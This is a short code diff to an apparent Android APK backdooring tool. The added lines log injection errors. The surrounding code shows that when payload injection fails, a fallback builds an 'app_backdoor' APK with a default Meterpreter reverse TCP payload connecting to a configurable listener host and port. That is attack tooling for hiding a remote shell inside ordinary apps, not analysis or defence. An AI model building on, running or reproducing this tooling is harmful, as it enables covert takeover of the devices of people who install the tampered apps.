@@ -895,6 +895,12 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy, sign_cfg)
         
         if not injection_success:
+            try:
+                with build_log.open("a") as log:
+                    if getattr(injector, "last_error", ""):
+                        log.write("\n[diagnostic] " + injector.last_error + "\n")
+            except Exception:
+                pass
             if ENABLE_FALLBACK_BACKDOOR_APK:
                 fb_ok = fallback_backdoor_apk(original_apk, workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk"), params.get("lhost", "127.0.0.1"), params.get("lport", "4444"), params.get("payload", "android/meterpreter/reverse_tcp"), build_log)
                 if fb_ok:
